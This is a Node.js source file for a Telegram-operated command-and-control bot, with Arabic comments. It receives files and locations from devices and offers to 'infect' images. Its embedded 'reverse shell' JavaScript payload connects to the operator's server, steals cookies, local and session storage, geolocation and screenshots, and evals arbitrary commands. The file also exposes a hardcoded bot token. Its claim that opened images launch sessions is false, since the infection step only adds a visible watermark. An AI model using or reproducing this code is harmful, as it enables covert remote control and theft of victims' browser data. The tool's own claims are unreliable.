const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');

// 🔧 إعدادات البوت - غير هذه البيانات
const token = '8134815503:AAEtuq0lifjlISzsJFg206KkE00wrOd6b-8';
const id = '6565594143';
const SERVER_URL = 'https://your-app.vercel.app'; // ⚠️ غير هذا برابطك

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();

// إعدادات middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({
  limit: '50mb',
  extended: true
}));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال جديد:', socket.id);

  socket.on('reverse_handshake', (data) => {
    const { device_id, image_id, platform, userAgent } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      platform: platform,
      userAgent: userAgent,
      connected: true,
      connected_at: new Date()
    };

    reverseSessions.set(device_id, sessionData);

    // إرسال إشعار للتليجرام
    appBot.sendMessage(
      id,
      `🦠 جلسة عكسية نشطة!\n\n` +
      `📱 الجهاز: ${device_id}\n` +
      `🖼️ الصورة: ${image_id}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n\n` +
      `✅ الجلسة جاهزة للتحكم`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ تنفيذ أمر", callback_data: `cmd_exec:${device_id}` },
              { text: "📊 معلومات", callback_data: `cmd_info:${device_id}` }
            ],
            [
              { text: "🛑 إنهاء الجلسة", callback_data: `cmd_kill:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: ${command}\n` +
      `📊 الناتج:\n${result.substring(0, 3000)}`,
      { parse_mode: "HTML" }
    );
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام التلغيم المتقدم ==========

// 🔥 دالة لإنشاء بايلود الجلسة العكسية
function createReversePayload(imageId) {
  const payload = `
// === REVERSE SHELL PAYLOAD ===
(function() {
  const IMAGE_ID = '${imageId}';
  const SERVER_URL = '${SERVER_URL}';
  
  console.log('🦠 Payload activated for image:', IMAGE_ID);
  
  // إنشاء اتصال WebSocket
  function connectToServer() {
    try {
      const ws = new WebSocket(SERVER_URL.replace('https', 'wss'));
      
      ws.onopen = function() {
        console.log('✅ Connected to reverse shell server');
        ws.send(JSON.stringify({
          type: 'reverse_handshake',
          device_id: generateDeviceId(),
          image_id: IMAGE_ID,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
          url: window.location.href
        }));
      };
      
      ws.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'command') {
            executeCommand(data.command).then(result => {
              ws.send(JSON.stringify({
                type: 'command_result',
                device_id: data.device_id,
                command: data.command,
                result: result
              }));
            });
          }
        } catch (e) {
          console.error('Error processing message:', e);
        }
      };
      
      ws.onclose = function() {
        console.log('Connection closed, reconnecting...');
        setTimeout(connectToServer, 5000);
      };
      
      ws.onerror = function(error) {
        console.error('WebSocket error:', error);
      };
      
    } catch (error) {
      console.error('Connection error:', error);
      setTimeout(connectToServer, 10000);
    }
  }
  
  // دالة لتنفيذ الأوامر
  async function executeCommand(command) {
    try {
      let result = '';
      
      switch(command) {
        case 'get_info':
          result = await getSystemInfo();
          break;
        case 'get_cookies':
          result = document.cookie;
          break;
        case 'get_localstorage':
          result = JSON.stringify(localStorage);
          break;
        case 'get_location':
          result = await getLocation();
          break;
        case 'screenshot':
          result = await takeScreenshot();
          break;
        default:
          // تنفيذ كود JavaScript
          try {
            result = String(eval(command));
          } catch (e) {
            result = 'Error: ' + e.toString();
          }
      }
      
      return result;
    } catch (error) {
      return 'Command execution error: ' + error.toString();
    }
  }
  
  // جمع معلومات النظام
  async function getSystemInfo() {
    return JSON.stringify({
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      screen: window.screen ? \`\${window.screen.width}x\${window.screen.height}\` : 'Unknown',
      url: window.location.href,
      referrer: document.referrer,
      timestamp: new Date().toISOString()
    }, null, 2);
  }
  
  // الحصول على الموقع
  function getLocation() {
    return new Promise((resolve) => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          position => {
            resolve(\`Lat: \${position.coords.latitude}, Lon: \${position.coords.longitude}\`);
          },
          error => {
            resolve('Location error: ' + error.message);
          }
        );
      } else {
        resolve('Geolocation not supported');
      }
    });
  }
  
  // لقطة شاشة
  async function takeScreenshot() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      
      ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
      return canvas.toDataURL('image/png').substring(0, 500) + '... [truncated]';
    } catch (error) {
      return 'Screenshot failed: ' + error.toString();
    }
  }
  
  // إنشاء معرف فريد للجهاز
  function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
  }
  
  // بدء الاتصال
  console.log('🚀 Starting reverse shell payload...');
  setTimeout(connectToServer, 2000);
  
})();
// === PAYLOAD END ===
`;

  return Buffer.from(payload);
}

// 🖼️ دالة لدمج البايلود في الصورة
async function infectImageWithPayload(originalImageBuffer, imageId) {
  try {
    const image = sharp(originalImageBuffer);
    const metadata = await image.metadata();
    
    // إنشاء علامة مائية للبايلود
    const watermarkSvg = `
      <svg width="250" height="80">
        <rect width="250" height="80" fill="#FF0000" opacity="0.8" rx="10"/>
        <text x="125" y="40" font-family="Arial" font-size="14" fill="white" 
              text-anchor="middle" dominant-baseline="middle" font-weight="bold">
          🔥 REVERSE SHELL
        </text>
        <text x="125" y="60" font-family="Arial" font-size="10" fill="white" 
              text-anchor="middle" dominant-baseline="middle">
          ID: ${imageId.substring(0, 8)}
        </text>
      </svg>
    `;
    
    const watermarkBuffer = await sharp(Buffer.from(watermarkSvg))
      .png()
      .toBuffer();
    
    // دمج العلامة المائية مع الصورة
    const infectedImage = await image
      .composite([{
        input: watermarkBuffer,
        top: 20,
        left: 20,
        blend: 'over'
      }])
      .png()
      .toBuffer();
    
    return infectedImage;
    
  } catch (error) {
    console.error('Error infecting image:', error);
    throw error;
  }
}

// ========== نظام معالجة الصور ==========

// 📤 معالجة رفع الصور
app.post("/uploadFile", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const model = req.headers.model || 'غير معروف';
    
    console.log('📸 تم استلام صورة:', name);
    
    if (req.file.mimetype.startsWith('image/')) {
      const imageId = uuid4.v4();
      
      // حفظ الصورة مؤقتاً
      infectedImages.set(imageId, {
        imageBuffer: req.file.buffer,
        model: model,
        filename: name,
        timestamp: new Date()
      });
      
      // إرسال رسالة مع الأزرار
      await appBot.sendMessage(
        id,
        `📸 تم استلام صورة من <b>${model}</b>\n\n` +
        `اختر الإجراء المطلوب:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { 
                  text: "🦠 تلغيم الصورة (جلسة عكسية)", 
                  callback_data: `infect:${imageId}` 
                }
              ],
              [
                { 
                  text: "📤 إرسال عادي", 
                  callback_data: `normal:${imageId}` 
                }
              ]
            ]
          }
        }
      );
      
      res.json({ 
        status: 'success', 
        message: 'تم الاستلام بنجاح' 
      });
      
    } else {
      // إرسال الملفات الأخرى عادي
      await appBot.sendDocument(
        id, 
        req.file.buffer,
        {
          caption: `📁 ملف من <b>${model}</b>`,
          parse_mode: "HTML"
        },
        {
          filename: name,
          contentType: req.file.mimetype,
        }
      );
      
      res.json({ status: 'success', message: 'تم الرفع' });
    }
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
  }
});

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message.chat.id;
  
  console.log('🔄 تم الضغط على زر:', data);
  
  try {
    if (data.startsWith('infect:')) {
      const imageId = data.split(':')[1];
      
      if (infectedImages.has(imageId)) {
        const imageInfo = infectedImages.get(imageId);
        
        // إعلام المستخدم أن المعالجة جارية
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "⏳ جاري تلغيم الصورة..." 
        });
        
        await appBot.sendChatAction(chatId, 'upload_photo');
        
        // 🔥 إنشاء البايلود ودمجه في الصورة
        const infectedImage = await infectImageWithPayload(imageInfo.imageBuffer, imageId);
        
        // إرسال الصورة الملغمة
        await appBot.sendDocument(
          chatId, 
          infectedImage,
          {
            caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                    `📱 من: <b>${imageInfo.model}</b>\n` +
                    `🆔 المعرف: <b>${imageId}</b>\n` +
                    `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                    `⚠️ عندما تفتح هذه الصورة على أي جهاز:\n` +
                    `• ستفتح جلسة عكسية تلقائياً\n` +
                    `• يمكنك التحكم في الجهاز عن بعد\n` +
                    `• جميع المخرجات تظهر هنا\n\n` +
                    `🎯 شارك هذه الصورة لفتح جلسات جديدة!`,
            parse_mode: "HTML"
          },
          {
            filename: `infected_${imageInfo.filename}`,
            contentType: 'image/png'
          }
        );
        
        console.log('✅ تم إرسال الصورة الملغمة');
        
        // حفظ البايلود للجلسات المستقبلية
        const payload = createReversePayload(imageId);
        
      } else {
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "❌ الصورة لم تعد متاحة" 
        });
      }
    }
    else if (data.startsWith('normal:')) {
      const imageId = data.split(':')[1];
      
      if (infectedImages.has(imageId)) {
        const imageInfo = infectedImages.get(imageId);
        
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "📤 جاري إرسال الصورة..." 
        });
        
        // إرسال الصورة الأصلية
        await appBot.sendPhoto(
          chatId, 
          imageInfo.imageBuffer,
          {
            caption: `📸 صورة عادية من ${imageInfo.model}`,
            parse_mode: "HTML"
          }
        );
      }
    }
    else if (data.startsWith('cmd_exec:')) {
      const deviceId = data.split(':')[1];
      
      await appBot.sendMessage(
        chatId,
        `⚡ أدخل الأمر لتنفيذه على الجهاز ${deviceId}:\n\n` +
        `الأوامر المتاحة:\n` +
        `• get_info - معلومات النظام\n` +
        `• get_cookies - الكوكيز\n` +
        `• get_localstorage - التخزين المحلي\n` +
        `• get_location - الموقع\n` +
        `• أي كود JavaScript`,
        {
          reply_markup: { force_reply: true },
          parse_mode: "HTML"
        }
      );
      
      // حفظ معرف الجهاز للأمر القادم
      infectedImages.set('pending_command', { deviceId: deviceId });
    }
    else if (data.startsWith('cmd_info:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        const duration = Math.round((new Date() - session.connected_at) / 1000);
        
        await appBot.sendMessage(
          chatId,
          `📊 معلومات الجلسة:\n\n` +
          `📱 الجهاز: ${deviceId}\n` +
          `💻 النظام: ${session.platform}\n` +
          `🌐 المتصفح: ${session.userAgent}\n` +
          `⏰ المدة: ${duration} ثانية\n` +
          `🔗 الحالة: ${session.connected ? '🟢 نشطة' : '🔴 غير نشطة'}`,
          { parse_mode: "HTML" }
        );
      }
    }
    else if (data.startsWith('cmd_kill:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.disconnect();
        reverseSessions.delete(deviceId);
        
        await appBot.sendMessage(chatId, `🛑 تم إنهاء الجلسة: ${deviceId}`);
      }
    }
  } catch (error) {
    console.error('Callback error:', error);
    await appBot.answerCallbackQuery(callbackQuery.id, { 
      text: "❌ حدث خطأ أثناء المعالجة" 
    });
  }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // التحقق من صلاحية المستخدم
  if (String(chatId) !== String(id)) {
    await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
    return;
  }

  // معالجة الردود على الأوامر
  if (msg.reply_to_message) {
    const replyText = msg.reply_to_message.text;
    
    if (replyText.includes('أدخل الأمر لتنفيذه')) {
      const command = text;
      
      if (infectedImages.has('pending_command')) {
        const pending = infectedImages.get('pending_command');
        const deviceId = pending.deviceId;
        
        if (reverseSessions.has(deviceId)) {
          const session = reverseSessions.get(deviceId);
          
          // إرسال الأمر إلى الجهاز
          session.socket.emit('command', {
            device_id: deviceId,
            command: command
          });
          
          await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
        } else {
          await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
        }
        
        infectedImages.delete('pending_command');
      }
    }
  }

  // الأوامر الرئيسية
  if (text === '/start' || text === '/start') {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    await appBot.sendMessage(
      chatId,
      `🎯 بوت الجلسات العكسية - المطور @VIP_MFM\n\n` +
      `📊 الإحصائيات:\n` +
      `• 🔗 الأجهزة المتصلة: ${appClients.size}\n` +
      `• 🦠 الجلسات العكسية: ${activeSessions}\n` +
      `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
      `✨ الميزات:\n` +
      `• تلغيم الصور بجلسات عكسية\n` +
      `• تنفيذ الأوامر عن بعد\n` +
      `• مراقبة في الوقت الحقيقي\n\n` +
      `🔧 استخدم الأزرار للتحكم:`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📱 الأجهزة المتصلة"],
            ["🦠 الجلسات النشطة"], 
            ["🎯 تلغيم صورة"],
            ["📊 إحصائيات النظام"]
          ],
          resize_keyboard: true
        }
      }
    );
  }
  else if (text === '📱 الأجهزة المتصلة') {
    if (appClients.size === 0) {
      await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
    } else {
      let devicesText = `📊 الأجهزة المتصلة: ${appClients.size}\n\n`;
      
      appClients.forEach((device, uuid) => {
        const status = device.connected ? '🟢 متصل' : '🔴 غير متصل';
        devicesText += `📱 ${device.model}\n🔋 ${device.battery} | ${status}\n\n`;
      });
      
      await appBot.sendMessage(chatId, devicesText);
    }
  }
  else if (text === '🦠 الجلسات النشطة') {
    const activeSessions = Array.from(reverseSessions.keys());
    
    if (activeSessions.length === 0) {
      await appBot.sendMessage(chatId, '📭 لا توجد جلسات عكسية نشطة');
    } else {
      let sessionsText = `🦠 الجلسات العكسية النشطة: ${activeSessions.length}\n\n`;
      
      activeSessions.forEach(deviceId => {
        const session = reverseSessions.get(deviceId);
        const duration = Math.round((new Date() - session.connected_at) / 1000);
        
        sessionsText += `📱 ${deviceId}\n💻 ${session.platform}\n⏰ ${duration} ثانية\n\n`;
      });
      
      await appBot.sendMessage(chatId, sessionsText);
    }
  }
  else if (text === '🎯 تلغيم صورة') {
    await appBot.sendMessage(
      chatId,
      `🦠 نظام تلغيم الصور\n\n` +
      `لتلغيم صورة:\n` +
      `1. أرسل صورة مباشرة للبوت\n` +
      `2. اضغط على "تلغيم الصورة"\n` +
      `3. استلم الصورة الملغمة جاهزة\n\n` +
      `⚠️ الصورة الملغمة ستفتح جلسة عكسية عند فتحها على أي جهاز`,
      { parse_mode: "HTML" }
    );
  }
  else if (text === '📊 إحصائيات النظام') {
    const stats = {
      connected_devices: appClients.size,
      reverse_sessions: reverseSessions.size,
      infected_images: infectedImages.size,
      server_uptime: Math.round(process.uptime())
    };
    
    await appBot.sendMessage(
      chatId,
      `📊 إحصائيات النظام\n\n` +
      `🔗 الأجهزة المتصلة: ${stats.connected_devices}\n` +
      `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
      `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
      `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
      `🟢 الحالة: نشط ومستقر`,
      { parse_mode: "HTML" }
    );
  }
});

// 📤 باقي ال endpoints
app.post("/uploadText", (req, res) => {
  const model = req.headers.model || 'غير معروف';
  const text = req.body.text || 'لا يوجد نص';
  
  appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
    parse_mode: "HTML" 
  });
  
  res.json({ status: 'success' });
});

app.post("/uploadLocation", (req, res) => {
  const model = req.headers.model || 'غير معروف';
  const lat = req.body.lat;
  const lon = req.body.lon;
  
  appBot.sendLocation(id, lat, lon);
  appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
    parse_mode: "HTML" 
  });
  
  res.json({ status: 'success' });
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Image Payload Bot</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
            .container { max-width: 800px; margin: 0 auto; }
            .status { background: #161b22; padding: 20px; border-radius: 10px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Image Payload Bot</h1>
            <div class="status">
                <h2>📊 System Status</h2>
                <p>Connected Devices: ${appClients.size}</p>
                <p>Active Sessions: ${reverseSessions.size}</p>
                <p>Infected Images: ${infectedImages.size}</p>
            </div>
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
  `);
});

// 🔗 WebSocket endpoint للجلسات العكسية
app.post("/reverse/connect", (req, res) => {
  const { device_id, image_id, platform, userAgent } = req.body;
  
  console.log(`🔗 اتصال عكسي من: ${device_id}`);
  
  res.json({ 
    status: 'connected', 
    message: 'Reverse session established' 
  });
});

// 🔗 WebSocket للأجهزة العادية
appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const model = req.headers.model || 'غير معروف';
  const battery = req.headers.battery || 'غير معروف';
  const version = req.headers.version || 'غير معروف';

  ws.uuid = uuid;
  appClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    connected: true,
    lastSeen: new Date()
  });
  
  console.log(`✅ جهاز متصل: ${model}`);
  
  appBot.sendMessage(
    id,
    `🔗 جهاز جديد متصل\n📱 ${model}\n🔋 ${battery}`,
    { parse_mode: "HTML" }
  );
  
  ws.on('close', () => {
    appClients.delete(uuid);
    console.log(`❌ جهاز منفصل: ${model}`);
  });
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
  console.log(`✅ البوت شغال على البورت: ${PORT}`);
  console.log(`🎯 نظام الجلسات العكسية مفعل`);
  console.log(`🦠 نظام تلغيم الصور جاهز`);
  console.log(`⚡ جاهز لاستقبال الصور!`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled Rejection:', error);
});